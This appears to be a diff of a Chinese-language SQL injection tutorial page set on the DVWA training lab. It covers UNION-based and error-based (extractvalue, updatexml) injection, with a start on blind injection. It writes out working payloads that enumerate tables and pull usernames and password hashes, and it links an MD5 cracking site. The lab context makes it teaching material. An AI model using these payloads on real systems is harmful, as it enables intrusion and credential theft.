@@ -78,7 +78,6 @@
 <ul>
 <li><a href="#h:b83514e8-6a71-4763-b01e-d7c9f7bfe1de">布尔盲注</a></li>
 <li><a href="#h:d139c7d4-990d-4c3b-858d-08d499f4daf0">时间盲注</a></li>
-<li><a href="#h:19bd872c-6835-4fc0-b17c-6b143dcaeac4">总结：盲注需要掌握的几种函数</a></li>
 </ul>
 </li>
 <li><a href="#h:c33bced9-e6d5-4f87-bd99-ff10d290e903">堆叠查询注入</a>
@@ -691,8 +690,8 @@ Empty set (0.00 sec)
 </p>
 
 
-<figure id="orgf7ff94f">
-<img src="./images/Snipaste_2023-06-06_00-16-30.png" alt="Snipaste_2023-06-06_00-16-30.png" width="60%">
+<figure id="orgfa7101d">
+<img src="./images/Snipaste_2023-06-06_00-16-30.png" alt="Snipaste_2023-06-06_00-16-30.png" width="90%">
 
 </figure>
 
@@ -847,11 +846,25 @@ dvwa SQL注入页面测试
 </p>
 
 <p>
-注意：UNION操作符选取不重复的值。如果允许重复的值，请使用 UNION ALL。
+注意：
+</p>
+<ul class="org-ul">
+<li>UNION操作符选取不重复的值。如果允许重复的值，请使用 UNION ALL。</li>
+<li><p>
+使用union查询，必需保证左右两边的列数一致，否则报错
 </p>
 
+<p>
+以下以DVWA靶场讲解，安全等级为Low.
+</p></li>
+</ul>
+
 <div class="org-src-container">
-<pre class="src src-sh">mysql&gt; select user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1 union all select
+<pre class="src src-sh">mysql&gt; use dvwa
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22810;&#34920;&#32437;&#21521;&#21512;&#24182;union</span>
+<span style="color: #b22222;">#</span><span style="color: #b22222;">union all &#20801;&#35768;&#37325;&#22797; &#25512;&#33616;&#20351;&#29992;&#65292;&#20197;&#20813;&#25968;&#25454;&#36951;&#28431;</span>
+mysql&gt; select user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1 union all select
 user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1;
 +---------+------------+
 | user_id | first_name |
@@ -859,7 +872,8 @@ user_id,first_name from users where <span style="color: #a0522d;">user_id</span>
 | 1 | admin |
 | 1 | admin |
 +---------+------------+
-2 rows<span style="color: #a020f0;"> in</span> set (0.01 sec)
+
+<span style="color: #b22222;">#</span><span style="color: #b22222;">union &#19981;&#20801;&#35768;&#37325;&#22797;</span>
 mysql&gt; select user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1 union select
 user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1;
 +---------+------------+
@@ -867,19 +881,50 @@ user_id,first_name from users where <span style="color: #a0522d;">user_id</span>
 +---------+------------+
 | 1 | admin |
 +---------+------------+
+
+<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;union&#26597;&#35810;&#65292;&#24517;&#38656;&#20445;&#35777;&#24038;&#21491;&#20004;&#36793;&#30340;&#21015;&#25968;&#19968;&#33268;&#65292;&#21542;&#21017;&#25253;&#38169;</span>
+mysql&gt; select first_name,last_name from users where user_id =1 union all select first_name from users where <span style="color: #a0522d;">user_id</span>=1;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+
+mysql&gt; select first_name,last_name from users where user_id =1 union all select first_name,1 from users where <span style="color: #a0522d;">user_id</span>=1;
++------------+-----------+
+| first_name | last_name |
++------------+-----------+
+| admin      | admin     |
+| admin      | 1         |
++------------+-----------+
+
+<span style="color: #b22222;">#</span><span style="color: #b22222;">order by n &#23545;&#21015;&#20570;&#25490;&#24207;&#12290;&#24403;n&#36229;&#20986;&#25152;&#22312;&#21015;&#26102;&#25253;&#38169;</span>
+mysql&gt; select <span style="color: #8b2252;">'a'</span>,<span style="color: #8b2252;">'b'</span>,<span style="color: #8b2252;">'c'</span>,<span style="color: #8b2252;">'d'</span> ;
++---+---+---+---+
+| a | b | c | d |
++---+---+---+---+
+| a | b | c | d |
++---+---+---+---+
+
+mysql&gt; select <span style="color: #8b2252;">'a'</span>,<span style="color: #8b2252;">'b'</span>,<span style="color: #8b2252;">'c'</span>,<span style="color: #8b2252;">'d'</span> order by 4;
++---+---+---+---+
+| a | b | c | d |
++---+---+---+---+
+| a | b | c | d |
++---+---+---+---+
 1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)
+
+mysql&gt; select <span style="color: #8b2252;">'a'</span>,<span style="color: #8b2252;">'b'</span>,<span style="color: #8b2252;">'c'</span>,<span style="color: #8b2252;">'d'</span> order by 5; <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20174;&#31532;1&#21015;&#23454;&#39564;&#21040;&#25353;&#31532;5&#21015;&#65292;&#31532;5&#21015;&#25490;&#24207;&#25253;&#38169;&#65292;&#35828;&#26126;&#36825;&#20010;&#25968;&#25454;&#26377;4&#21015;</span>
+ERROR 1054 (42S22): Unknown column <span style="color: #8b2252;">'5'</span><span style="color: #a020f0;"> in</span> <span style="color: #8b2252;">'order clause'</span>
 </pre>
 </div>
 
+
 <p>
-使用Union注入的前提条件：页面上有显示位。
+<b>使用Union注入的前提条件：页面上有显示位。</b>
 </p>
 
 <p>
-1.通过 order 做字段排序，可以猜解出正确的字段数：
+第1步：通过 order 做字段排序，可以猜解出正确的字段数：
 </p>
 
-<pre class="example" id="orgd1263da">
+<pre class="example" id="orgd8feb92">
 order by n   # 通过不断尝试 n 的值直到出错，那么正确字段数就是 n-1
 </pre>
 
@@ -889,21 +934,24 @@ order by n   # 通过不断尝试 n 的值直到出错，那么正确字段数�
 <div class="org-src-container">
 <pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#24120;&#12290;&#21487;&#20197;&#20197;&#31532;2&#21015;&#20570;&#25490;&#24207;</span>
 1<span style="color: #8b2252;">' order by 2#</span>
-
-<span style="color: #8b2252;"># &#24322;&#24120;&#65292;&#35828;&#26126;&#23383;&#27573;&#25968;&#20026;2</span>
-<span style="color: #8b2252;">1'</span> order by 3#
 </pre>
 </div>
 
 
-<figure id="org8a201e0">
-<img src="./images/Snipaste_2023-06-03_22-00-00.png" alt="Snipaste_2023-06-03_22-00-00.png" width="60%">
+<figure id="org141d079">
+<img src="./images/Snipaste_2023-06-03_22-00-00.png" alt="Snipaste_2023-06-03_22-00-00.png" width="90%">
 
 </figure>
 
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#24322;&#24120;&#65292;&#35828;&#26126;&#23383;&#27573;&#25968;&#20026;2</span>
+1<span style="color: #8b2252;">' order by 3#</span>
+</pre>
+</div>
 
-<figure id="org97a060f">
-<img src="./images/Snipaste_2023-06-06_00-38-01.png" alt="Snipaste_2023-06-06_00-38-01.png" width="60%">
+
+<figure id="org20ecc02">
+<img src="./images/Snipaste_2023-06-06_00-38-01.png" alt="Snipaste_2023-06-06_00-38-01.png" width="90%">
 
 </figure>
 
@@ -912,13 +960,18 @@ order by n   # 通过不断尝试 n 的值直到出错，那么正确字段数�
 </p>
 
 <p>
-2.确定显示位
+第2步：确定显示位
 </p>
+
+<p>
+只有确定了显示位，才能构建出sql查询语句，让页面有显示
+</p>
+
 <div class="org-src-container">
 <pre class="src src-sh">1<span style="color: #8b2252;">' union select 1,2#</span>
 
 <span style="color: #8b2252;"># &#36716;&#25442;&#21040;&#25968;&#25454;&#24211;&#20013;&#25191;&#34892;&#35821;&#21477;&#26159;</span>
-<span style="color: #8b2252;">mysql&gt; select first_name, last_name from users where user_id = '</span>1<span style="color: #8b2252;">' union all select 1,2 from users where user_id = 1# '</span>;
+<span style="color: #8b2252;">mysql&gt; select first_name, last_name from users where user_id = '</span>1<span style="color: #8b2252;">' union all select 1,2 # '</span>;
     -&gt; ;
 +------------+-----------+
 | first_name | last_name |
@@ -928,54 +981,40 @@ order by n   # 通过不断尝试 n 的值直到出错，那么正确字段数�
 +------------+-----------+
 2 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)
 
-mysql&gt; select first_name, last_name from users where user_id = <span style="color: #8b2252;">'1'</span> union all select 1,2 <span style="color: #b22222;"># </span><span style="color: #b22222;">';</span>
-    -&gt; ;
-+------------+-----------+
-| first_name | last_name |
-+------------+-----------+
-| admin      | admin     |
-| 1          | 2         |
-+------------+-----------+
-2 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)
+mysql&gt; select database();
++------------+
+| database() |
++------------+
+| dvwa       |
++------------+
 
-mysql&gt; select 1,2;
-+---+---+
-| 1 | 2 |
-+---+---+
-| 1 | 2 |
-+---+---+
-1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)
-
-mysql&gt; select 1,2 from users;
-+---+---+
-| 1 | 2 |
-+---+---+
-| 1 | 2 |
-| 1 | 2 |
-| 1 | 2 |
-| 1 | 2 |
-| 1 | 2 |
-+---+---+
+mysql&gt; select version();
++---------------------+
+| version()           |
++---------------------+
+| 5.5.54-0+deb8u1-log |
++---------------------+
 </pre>
 </div>
 
+
+
+<figure id="org94f6c6c">
+<img src="./images/img_20250529_211456.png" alt="img_20250529_211456.png" width="90%">
+
+</figure>
+
+
 <p>
-这里的1和2是无意的，仅用来是否可以显示 。
+这里的1和2是无意的，仅用来是否可以显示 。是否可以用database()替换1，version()替换2？
 </p>
 
-<p width="60%">
-<a href="./images/Snipaste_2023-06-06_00-41-04.pn" width="60%">./images/Snipaste_2023-06-06_00-41-04.pn</a>
-</p>
-
 <p>
-爆出数据库名和版本信息
+第3步：爆出数据库名和版本信息
 </p>
 <div class="org-src-container">
-<pre class="src src-sh">1<span style="color: #8b2252;">' union select database(),version()#</span>
-
-
-<span style="color: #8b2252;"># &#36716;&#25442;&#21040;&#25968;&#25454;&#24211;&#20013;&#25191;&#34892;&#35821;&#21477;&#26159;</span>
-<span style="color: #8b2252;">mysql&gt; select first_name, last_name from users where user_id = '</span>1<span style="color: #8b2252;">' union  select database(),version() # '</span>
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#24211;&#20013;&#25191;&#34892;&#35821;&#21477;&#26159;</span>
+mysql&gt; select first_name, last_name from users where user_id = <span style="color: #8b2252;">'1'</span> union  select database(),version() <span style="color: #b22222;"># </span><span style="color: #b22222;">'</span>
     -&gt; ;
 +------------+---------------------+
 | first_name | last_name           |
@@ -983,17 +1022,31 @@ mysql&gt; select 1,2 from users;
 | admin      | admin               |
 | dvwa       | 5.5.54-0+deb8u1-log |
 +------------+---------------------+
+
+<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22914;&#26524;&#25442;&#21040;&#21069;&#31471;&#23601;&#36825;&#26679;&#36755;&#20837;</span>
+1<span style="color: #8b2252;">' union select database(),version()#</span>
 </pre>
 </div>
+
+
+
+<figure id="org0764238">
+<img src="./images/img_20250529_211720.png" alt="img_20250529_211720.png" width="90%">
+
+</figure>
+
 
 <p>
 在讲解如何利用Union注入进一步获取数据库名、表名、字段名以及字段中的数据之前，先介绍一个重要的知识点：MySQL 5.0以上版本，存在一个自带的数据库名为：information_schema（重点）。
 </p>
 
 <p>
-information_schema数据库中有三个表非常重要：
+information_schema数据库中
 </p>
 
+<p>
+三个表非常重要：
+</p>
 <ul class="org-ul">
 <li>SCHEMATA：表里包含所有数据库的名字</li>
 <li>TABLES：表里包含所有数据库的所有表，默认字段为table_name</li>
@@ -1010,46 +1063,51 @@ information_schema数据库中有三个表非常重要：
 <li>COLUMN_NAME：字段名</li>
 </ul>
 
+<p>
+范例：
+</p>
 <div class="org-src-container">
-<pre class="src src-mysql">mysql&gt; use information_schema
-mysql&gt; desc COLUMNS; # 查看所有表的字段
+<pre class="src src-sh">mysql&gt; use information_schema
+
+mysql&gt; select * from SCHEMATA; <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25152;&#26377;&#24211;&#21517;</span>
++--------------+--------------------+----------------------------+------------------------+----------+
+| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
++--------------+--------------------+----------------------------+------------------------+----------+
+| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |
+| def          | dvwa               | latin1                     | latin1_swedish_ci      | NULL     |
+| def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     |
+| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |
++--------------+--------------------+----------------------------+------------------------+----------+
+
+mysql&gt; desc COLUMNS; <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#25152;&#26377;&#34920;&#30340;&#23383;&#27573;</span>
 +--------------------------+---------------------+------+-----+---------+-------+
 | Field                    | Type                | Null | Key | Default | Extra |
 +--------------------------+---------------------+------+-----+---------+-------+
-| TABLE_SCHEMA             | varchar(64)         | NO   |     |         |       |
-| TABLE_NAME               | varchar(64)         | NO   |     |         |       |
-| COLUMN_NAME              | varchar(64)         | NO   |     |         |       |
+| TABLE_SCHEMA             | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24211;&#21517;</span>
+| TABLE_NAME               | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#34920;&#21517;</span>
+| COLUMN_NAME              | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23383;&#27573;&#21517;</span>
 
-mysql&gt; select table_name from information_schema.tables where table_schema = 'dvwa';
-+------------+
-| table_name |
-+------------+
-| guestbook  |
-| users      |
-+------------+
-
-mysql&gt; select first_name,last_name from users where user_id ='1' union select 1,table_name from information_schema.tables where table_schema='dvwa' #'
-    -&gt; ;
-+------------+-----------+
-| first_name | last_name |
-+------------+-----------+
-| admin      | admin     |
-| 1          | guestbook |
-| 1          | users     |
+mysql&gt; desc tables; <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#26377;&#34920;</span>
++-----------------+---------------------+------+-----+---------+-------+
+| Field           | Type                | Null | Key | Default | Extra |
++-----------------+---------------------+------+-----+---------+-------+
+| TABLE_CATALOG   | varchar(512)        | NO   |     |         |       |
+| TABLE_SCHEMA    | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24211;&#21517;</span>
+| TABLE_NAME      | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#34920;&#21517;</span>
 </pre>
 </div>
+
 
 <p>
-联合注入的过程：
+<b>联合注入的过程：</b>
 </p>
-<div class="org-src-container">
-<pre class="src src-sh">&#21028;&#26029;&#27880;&#20837;&#28857;
-&#21028;&#26029;&#26159;&#25972;&#22411;&#36824;&#26159;&#23383;&#31526;&#22411;
-&#21028;&#26029;&#21015;&#25968;&#65288;order by&#65289;&#12289;&#26174;&#31034;&#20301;(&#26681;&#25454;&#39029;&#38754;&#21069;&#31471;&#30340;&#26174;&#31034;&#21028;&#26029;)
-&#33719;&#21462;&#30446;&#26631;&#25968;&#25454;&#24211;&#21517;
-&#33719;&#21462;&#30446;&#26631;&#25968;&#25454;&#24211;&#30340;&#25152;&#26377;&#34920;&#21517;&#12289;&#23383;&#27573;&#21517;&#12289;&#23383;&#27573;&#20013;&#30340;&#25968;&#25454;
-</pre>
-</div>
+<ul class="org-ul">
+<li>判断注入点</li>
+<li>判断是整型还是字符型</li>
+<li>判断列数（order by）、显示位(根据页面前端的显示判断)</li>
+<li>获取目标数据库名</li>
+<li>获取目标数据库的所有表名、字段名、字段中的数据</li>
+</ul>
 
 <p>
 爆出dvwa数据库中有 guestbook,users 两个表：
@@ -1064,20 +1122,50 @@ mysql&gt; select first_name,last_name from users where user_id ='1' union select
 </div>
 
 <p>
+范例：爆出dvwa数据库中所有表
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;dvwa&#24211;&#20013;&#65292;&#25152;&#26377;&#34920;&#21517;&#12290;</span>
+mysql&gt; select table_name from information_schema.tables where table_schema = <span style="color: #8b2252;">'dvwa'</span>;
++------------+
+| table_name |
++------------+
+| guestbook  |
+| users      |
++------------+
+
+<span style="color: #b22222;">#</span><span style="color: #b22222;">&#37197;&#21512;union&#32852;&#21512;&#26597;&#35810;</span>
+mysql&gt; use dvwa
+
+mysql&gt; select first_name,last_name from users where user_id =<span style="color: #8b2252;">'1'</span> union select 1,table_name from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=<span style="color: #8b2252;">'dvwa'</span> <span style="color: #b22222;">#</span><span style="color: #b22222;">'</span>
+    -&gt; ;
++------------+-----------+
+| first_name | last_name |
++------------+-----------+
+| admin      | admin     |
+| 1          | guestbook |
+| 1          | users     |
+
+<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36716;&#25442;&#25104;&#39029;&#38754;&#19978;</span>
+1<span style="color: #8b2252;">' union select 1,table_name from information_schema.tables where table_schema='</span>dvwa<span style="color: #8b2252;">' #</span>
+</pre>
+</div>
+
+<p>
 范例：解决页面显示位不足问题，利用 group_concat 函数将组中的字符串连接成为单个字符串
 </p>
 
 <div class="org-src-container">
-<pre class="src src-mysql">mysql&gt; select group_concat(user_id) from users;
+<pre class="src src-sh">mysql&gt; select group_concat(user_id) from users;
 +-----------------------+
 | group_concat(user_id) |
 +-----------------------+
 | 1,2,3,4,5             |
 +-----------------------+
-1 row in set (0.00 sec)
+1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)
 
-# 找到 dvwa 库所有表名
-mysql&gt; select first_name,last_name from users where user_id ='1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa' #'
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25214;&#21040; dvwa &#24211;&#25152;&#26377;&#34920;&#21517;</span>
+mysql&gt; select first_name,last_name from users where user_id =<span style="color: #8b2252;">'1'</span> union select 1,group_concat(table_name) from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=<span style="color: #8b2252;">'dvwa'</span> <span style="color: #b22222;">#</span><span style="color: #b22222;">'</span>
     -&gt; ;
 +------------+-----------------+
 | first_name | last_name       |
@@ -1085,6 +1173,9 @@ mysql&gt; select first_name,last_name from users where user_id ='1' union select
 | admin      | admin           |
 | 1          | guestbook,users |
 +------------+-----------------+
+
+<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36716;&#25442;&#21040;&#39029;&#38754;&#20026;</span>
+1<span style="color: #8b2252;">' union select 1,group_concat(table_name) from information_schema.tables where table_schema='</span>dvwa<span style="color: #8b2252;">' #'</span>
 </pre>
 </div>
 
@@ -1104,7 +1195,8 @@ mysql&gt; select first_name,last_name from users where user_id ='1' union select
 范例：得到users表中的字段名
 </p>
 <div class="org-src-container">
-<pre class="src src-mysql">mysql&gt; select first_name,last_name from users where user_id = '1' UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users' #'
+<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#25968;&#25454;&#24211;&#20013;&#25191;&#34892;&#30340;&#35821;&#21477;</span>
+mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'1'</span> UNION SELECT 1,group_concat(column_name) from information_schema.columns where <span style="color: #a0522d;">table_schema</span>=<span style="color: #8b2252;">'dvwa'</span> and <span style="color: #a0522d;">table_name</span>=<span style="color: #8b2252;">'users'</span> <span style="color: #b22222;">#</span><span style="color: #b22222;">'</span>
     -&gt; ;
 +------------+---------------------------------------------------------------------------+
 | first_name | last_name                                                                 |
@@ -1112,9 +1204,9 @@ mysql&gt; select first_name,last_name from users where user_id ='1' union select
 | admin      | admin                                                                     |
 | 1          | user_id,first_name,last_name,user,password,avatar,last_login,failed_login |
 +------------+---------------------------------------------------------------------------+
-2 rows in set (0.00 sec)
+2 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)
 
-mysql&gt; select first_name,last_name from users where user_id = '1' union select user,password from users #
+mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'1'</span> union select user,password from users <span style="color: #b22222;">#</span>
     -&gt; ;
 +------------+----------------------------------+
 | first_name | last_name                        |
@@ -1133,7 +1225,6 @@ mysql&gt; select first_name,last_name from users where user_id = '1' union selec
 </p>
 
 <p>
-md5解密：
 md5解密在线 <a href="https://cmd5.com/">https://cmd5.com/</a>
 </p>
 </div>
@@ -1146,26 +1237,8 @@ md5解密在线 <a href="https://cmd5.com/">https://cmd5.com/</a>
 </p>
 
 <p>
-常用的特殊字符：
+常用的特殊字符：' \ ; %00 ) ( # "
 </p>
-<div class="org-src-container">
-<pre class="src src-sh"><span style="color: #8b2252;">' \ ; %00 ) ( # "</span>
-</pre>
-</div>
-<p>
-开发人员在开发时有可能会把这些特殊字符过滤掉，所以一般我们用16进制代替
-</p>
-
-<div class="org-src-container">
-<pre class="src src-sql">mysql&gt; <span style="color: #a020f0;">select</span> hex(<span style="color: #8b2252;">'~'</span>);
-+<span style="color: #b22222;">----------</span><span style="color: #b22222;">+</span>
-| hex(<span style="color: #8b2252;">'~'</span>) |
-+<span style="color: #b22222;">----------</span><span style="color: #b22222;">+</span>
-| 7E       |
-+<span style="color: #b22222;">----------</span><span style="color: #b22222;">+</span>
-</pre>
-</div>
-
 
 <p>
 在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数，这两个函数常用于报错注入：
@@ -1185,7 +1258,7 @@ md5解密在线 <a href="https://cmd5.com/">https://cmd5.com/</a>
 </p>
 
 <p>
-extractvalue()函数
+<b>1、 extractvalue()函数</b>
 </p>
 <ul class="org-ul">
 <li>此函数从目标XML中返回包含所查询值的字符串。语法：extractvalue（XML_document，xpath_string）
@@ -1193,17 +1266,47 @@ extractvalue()函数
 <li>第一个参数：string格式，为XML文档对象的名称</li>
 <li>第二个参数：xpath_string（xpath格式的字符串） ，为XML文档的路径</li>
 </ul></li>
-<li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
-</ul>
+<li><p>
+extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）。比如 ~ ! % ? @
+</p>
+
+<p>
+开发人员在开发时有可能会把这些特殊字符过滤掉，所以一般我们用16进制代替
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">mysql&gt; select hex(<span style="color: #8b2252;">'~'</span>);
++----------+
+| hex(<span style="color: #8b2252;">'~'</span>) |
++----------+
+| 7E       |
+
+mysql&gt; select first_Name,last_name from users where <span style="color: #a0522d;">1</span>=<span style="color: #8b2252;">'1'</span> and extractvalue(1,0x7e);
+ERROR 1105 (HY000): XPATH syntax error: <span style="color: #8b2252;">'~'</span>
+
+<span style="color: #b22222;">#</span><span style="color: #b22222;">concat&#20989;&#25968;&#29992;&#20110;&#23383;&#31526;&#20018;&#25340;&#25509;</span>
+mysql&gt; select concat(user_id,<span style="color: #8b2252;">'-'</span>,first_name) from  users;
++--------------------------------+
+| concat(user_id,<span style="color: #8b2252;">'-'</span>,first_name) |
++--------------------------------+
+| 1-admin                        |
+| 2-Gordon                       |
+| 3-Hack                         |
+| 4-Pablo                        |
+| 5-Bob                          |
++--------------------------------+
+</pre>
+</div>
 
 <div class="org-src-container">
 <pre class="src src-sql"><span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span>,password <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">where</span> user_id=1 <span style="color: #a020f0;">and</span> extractvalue(1,0x7e);
 <span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span>,password <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">where</span> user_id=1 <span style="color: #a020f0;">and</span> extractvalue(1,concat(0x7e,(<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span>()),0x7e));
 </pre>
 </div>
+
 <p>
 由于16进制0x7e就是~，~不属于xpath语法格式，因此报出xpath语法错误。
-</p>
+</p></li>
+</ul>
 
 <p>
 函数使用格式：extractvalue(XML_document，xpath_string)，作用是从document中返回包含string的字符串，如果string参数不符合xpath的语法就会报错，将查询的结果放在报错信息里，即extractvalue函数报错时会解析SQL语句。
@@ -1219,7 +1322,7 @@ extractvalue()函数
 <span style="color: #8b2252;"># &#29190;&#34920;&#25968;</span>
 <span style="color: #8b2252;">1'</span> and extractvalue(1,concat(0x7e,(<span style="color: #a020f0;">select</span> count(table_name) from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=database())));<span style="color: #b22222;">#</span>
 
-<span style="color: #b22222;"># </span><span style="color: #b22222;">&#29190;&#34920;&#21517;</span>
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#29190;&#34920;&#21517; limit 1,1 &#21363;(1, 1+1] &#31532;2&#26465;</span>
 1<span style="color: #8b2252;">' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1)));#</span>
 
 <span style="color: #8b2252;"># &#29190;&#21015;&#21517;</span>
@@ -1227,7 +1330,6 @@ extractvalue()函数
 
 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24471;&#21040;&#29992;&#25143;&#21517;&#23494;&#30721;</span>
 1<span style="color: #8b2252;">' and extractvalue(1,concat(0x7e,(select user from users where user_id=1)));#</span>
-
 <span style="color: #8b2252;">1'</span> and extractvalue(1,concat(0x7e,(<span style="color: #a020f0;">select</span> password from users where <span style="color: #a0522d;">user_id</span>=1)));<span style="color: #b22222;">#</span>
 
 <span style="color: #b22222;"># </span><span style="color: #b22222;">extractvalue&#20989;&#25968;&#33021;&#26597;&#35810;&#30340;&#26368;&#22823;&#38271;&#24230;&#20026;32&#65292;&#22914;&#26524;&#36229;&#20986;32&#20301;&#23383;&#31526;&#65292;&#37027;&#20040;&#23601;&#35201;&#21464;&#21160;&#25340;&#25509;&#39034;&#24207;&#65292;&#25110;&#32773;&#20351;&#29992;substring()&#20989;&#25968;&#25130;&#21462;&#25968;&#25454;</span>
@@ -1240,37 +1342,26 @@ extractvalue()函数
 </pre>
 </div>
 <p>
-注意： `select * from table limit m,n` ，其中 m 是指记录开始，从 0 开始，表示第一条记录； n 是指从第 m+1 条开始，取 n 条。
+注意： limit是对查询的结果进行输出行数数量限制。 <code>select * from table limit m,n</code> ，(m, m+n] 左开右闭。其中 m 是指记录开始，从 0 开始，表示第一条记录； n 是指从第 m+1 条开始，取 n 条。
 extractvalue()
 </p>
 
 <p>
-updatexml()函数
-updatexml()是一个使用不同的XML标记匹配和替换XML块的函数
+<b>2、updatexml()函数</b>
 </p>
-
-<p>
-作用：改变文档中符合条件的节点的值
-</p>
-
-<p>
-语法：
-</p>
-<div class="org-src-container">
-<pre class="src src-sh"><span style="color: #0000ff;">updatexml</span>(XML_document&#65292;xpath_string&#65292;new_value)
-&#31532;&#19968;&#20010;&#21442;&#25968;&#65306;&#26159;string&#26684;&#24335;&#65292;&#20026;XML&#25991;&#26723;&#23545;&#35937;&#30340;&#21517;&#31216;
-&#31532;&#20108;&#20010;&#21442;&#25968;&#65306;&#20195;&#34920;&#36335;&#24452;&#65292;xpath&#26684;&#24335;&#30340;&#23383;&#31526;&#20018;&#20363;&#22914;//title
-&#31532;&#19977;&#20010;&#21442;&#25968;&#65306;string&#26684;&#24335;&#65292;&#26367;&#25442;&#26597;&#25214;&#21040;&#30340;&#31526;&#21512;&#26465;&#20214;&#30340;&#25968;&#25454;
-</pre>
-</div>
-
-<p>
-updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）
-</p>
-
-<p>
-例如： `select * from test where id = 1 and updatexml(1,0x7e,3);` 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。
-</p>
+<ul class="org-ul">
+<li>updatexml()是一个使用不同的XML标记匹配和替换XML块的函数</li>
+<li>作用：改变文档中符合条件的节点的值</li>
+<li>语法：
+<ul class="org-ul">
+<li>updatexml(XML_document，xpath_string，new_value)</li>
+<li>第一个参数：是string格式，为XML文档对象的名称</li>
+<li>第二个参数：代表路径，xpath格式的字符串例如//title</li>
+<li>第三个参数：string格式，替换查找到的符合条件的数据</li>
+</ul></li>
+<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>例如： <code>select * from test where id = 1 and updatexml(1,0x7e,3);</code> 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
 
 <p>
 使用格式：updatexml(XML_document，xpath_string，new_value)，作用是将document的中符合string的字符串替换为value的值。同上，这里string参数不符合xpath语法也会报错。
@@ -1306,17 +1397,26 @@ updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath�
 <p>
 只会根据注入信息返回True跟False，没有了之前的查询信息或者报错信息。
 </p>
-</div>
-<ul class="org-ul">
-<li><a id="h:6a7fcb61-6620-4787-8217-1419d7c4d755"></a><b>1.判断是否存在注入，注入的类型</b><br>
-<div class="outline-text-6" id="text-h:6a7fcb61-6620-4787-8217-1419d7c4d755">
+
+<p>
+下面以dvwa靶场，安全等级Low为例讲解
+</p>
+
+<p>
+<b>1.判断是否存在注入，注入的类型</b>
+</p>
+
 <p>
 在 dvwa 中 SQL Injection (Blind) 测试
 </p>
+<ul class="org-ul">
+<li>输入1，提示 User ID exists in the database.</li>
+<li>输入' ，提示 User ID is MISSING from the database.</li>
+</ul>
 
 
-<figure id="orgbdf5aa5">
-<img src="./images/Snipaste_2023-06-03_22-13-18.png" alt="Snipaste_2023-06-03_22-13-18.png" width="60%">
+<figure id="org5701690">
+<img src="./images/Snipaste_2023-06-03_22-13-18.png" alt="Snipaste_2023-06-03_22-13-18.png" width="50%">
 
 </figure>
 
@@ -1328,15 +1428,61 @@ updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath�
 满足查询条件则返回"User ID exists in the database."，不满足查询条件则返回"User ID is MISSING from the database."；两者返回的内容随所构造的真假条件而不同，说明存在SQL盲注。
 </p>
 
-<div class="org-src-container">
